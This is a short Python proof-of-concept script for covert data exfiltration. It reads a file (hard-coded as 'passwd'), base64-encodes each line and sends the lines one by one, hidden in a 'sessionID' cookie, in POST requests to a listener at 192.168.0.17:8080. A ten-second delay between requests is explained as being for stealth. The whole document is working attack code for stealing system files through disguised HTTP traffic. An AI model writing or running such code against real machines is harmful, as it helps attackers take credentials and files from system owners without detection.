# read a file line by line
# Store each read result as base64 and then print it
# Create a cookie storing each encoded line and then send it to an http server
import base64
import requests
import time

# Read the target file and then print out each contents of it. 
def readFile(target_file):
	with open(target_file) as fp:
		# We turn the file into a list of elements with no new lines so we can feed the list element into a cookie
		line_list = fp.read().splitlines()

		# Reads the entire line, we don't want the entire line. We want to store each line in a list which we then pass on and then traverse through each list element and loop through it in a cookie request
		'''
		count = 1
		while line:
			print(line.strip())
			#line = fp.readline()
		'''

	return line_list

# Passwd file as PoC


# The cookie which is going to store the base64 encoded data that needs to be output for decoding/reconstruction
def exfil_cookie(data):
	jar = requests.cookies.RequestsCookieJar()
	jar.set('sessionID', data, domain='192.168.0.17', path='/')
	req = requests.post('http://192.168.0.17:8080/', cookies=jar)
	#req_text = req.text

	for cookie in jar:
		# Base64 encoded lines of the target file which we print out
		print(cookie.value)
	return jar

def encode_data(data):
	data_bytes = data.encode('ascii')
	msg_bytes = base64.b64encode(data_bytes)
	msg = msg_bytes.decode('ascii')

	return msg

def decode_data(data):
	data_bytes = data.encode('ascii')
	msg_bytes = base64.b64decode(data_bytes)
	msg = msg_bytes.decode('ascii')

	return msg


def main():
	target_file = readFile('passwd')
# Get the for loop and then stick 
	for line in target_file:
		encoded_line = encode_data(line)
		exfil_cookie(encoded_line)
		# Time between each cookie request made for stealth and performance purposes
		time.sleep(10)
		print("Decoded base64 data:",decode_data(encoded_line))

main()
